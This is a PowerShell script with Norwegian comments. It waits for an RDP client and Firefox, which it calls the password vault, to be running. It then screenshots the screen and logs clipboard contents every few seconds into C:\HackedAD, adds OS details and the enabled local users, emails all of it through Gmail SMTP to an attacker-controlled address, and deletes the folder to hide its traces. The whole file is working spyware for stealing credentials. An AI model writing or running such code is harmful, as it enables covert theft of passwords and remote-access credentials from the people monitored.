<#
Kommentar

Kilder:



 - Get-Service | Where-Object {$_.Status -eq 'Running'}

#> 
    
    
    
    
    # Create screen capture to reveale 'Computername' and 'Username' in RDP window 
function Screencapture {
            
        Start-Sleep -Seconds 3


           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
           $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
           $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
           $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
           $DrawingGraphics.Dispose()
           $ScreenshotObject.Save($PicPath)
           $ScreenshotObject.Dispose()

    }


function ProcessCheck {

    while ($true) {
        
        Start-Sleep -Seconds 2

        #Gettingmstsc/RDP process
        $string = Get-Process -Name 'mstsc' -ErrorAction SilentlyContinue
        $string2 = Get-Process -Name 'firefox' -ErrorAction SilentlyContinue
         
     
        #if the mstsc/RDP and firefox (the password vault) processes is running / waits for it to be started   
        $Check = (($string.ProcessName -eq 'mstsc') -and ($string2.ProcessName -eq 'firefox')) 
 
        if ($Check) {
            return $true
            break
        }
    }

}




function ClipboardScreenshotToFile {


    if (ProcessCheck) {

    # Create txt file, add the first clipboat content to the file. More clopboard content will be added in the loop. 
     
 
        $textFile = New-Item -Path "C:\HackedAD\copied.txt" -ItemType File -Force

        $TimeNow = Get-Date -Format dd/MM/yyyy:HH:mm:ss
        Set-Content -Path $textFile -Value $TimeNow, $Clipboard 



     #Create a timer
        $StartTime = Get-Date
        $EndTime   = $StartTime.AddSeconds(60)            # Endre Tid her--------<


        do {
       
       
        # Make scren capture with the time as filename

        #load required assembly
            Add-Type -Assembly System.Windows.Forms   

            $Path = New-Item -ItemType Directory -Force -Path C:\HackedAD\ 
          

        #get the current time and build the filename from it       
            $Time = (Get-Date)
                
            [string] $FileName = "$($Time.Day)"
            $FileName += '-'
            $FileName += "$($Time.Month)" 
            $FileName += '-'
            $FileName += "$($Time.Year)"
            $FileName += '-'
            $FileName += "$($Time.Hour)"
            $FileName += '-'
            $FileName += "$($Time.Minute)"
            $FileName += '-'
            $FileName += "$($Time.Second)"
            $FileName += '.png'
            
        #use join-path to add path to filename
            [string] $PicPath = (Join-Path $Path $FileName)




        # Run the function
            ScreenCapture

   
        # Append new (/not new) clipboard content to the file
            $Clipboard = Get-Clipboard
            $TimeNow = Get-Date -Format dd/MM/yyyy:HH:mm:ss
            Add-Content -Path "C:\HackedAD\copied.txt" -Value $TimeNow, $Clipboard


        # Time-interval, how often to take screnshot and add clipboard content to file
            Start-Sleep -Seconds 5
                       
                   
        } 
        while ($EndTime -gt (Get-Date))


     # Gathering other info about the local computer

        $InfoFile = New-Item -Path "C:\HackedAD\LocalPCInfo.txt" -ItemType File -Force

        Get-ComputerInfo -Property OsName,OsVersion,OsBuildNumber | Out-File -FilePath $InfoFile
        Add-Content -Path $InfoFile -Value "Active Users on Local Computer:"
        Get-LocalUser | Where-Object {$_.Enabled -eq 'True'} | Format-Table -Property Name | Out-File -Append -FilePath $InfoFile






     # Send Clipboard content and Screencapture on mail

            Start-Sleep -Seconds 5

            $username   = 'totallynothingshady@gmail.com'
            $password   = '<PASSWORD>'
            $secstr     = New-Object -TypeName System.Security.SecureString
            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}


            # All the files in the temporary directory added as attachment
            [array]$Attachments = Get-ChildItem "C:\HackedAD" *.*
            
        
            $Msg = @{
                from       = "totallynothingshady@gmail.com"
                to         = "totallynothingshady@gmail.com"
                subject    = "Clipboard Content and ScreenCapture"
                smtpserver = "smtp.gmail.com"
                port       = "587"
                body       = "Clipboard Content and ScreenCapture"
                credential = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
                usessl     = $true
                verbose    = $true
                Attachments = $Attachments.fullname
            }



            Send-MailMessage @Msg
  


    # Delete the temporary folder with text file and screencapture

     Start-Sleep -Seconds 10

     $Dir = "C:\HackedAD"
     Remove-Item -LiteralPath $Dir -Force -Recurse -ErrorAction SilentlyContinue

    } # Slutt på if
        


}
ClipboardScreenshotToFile


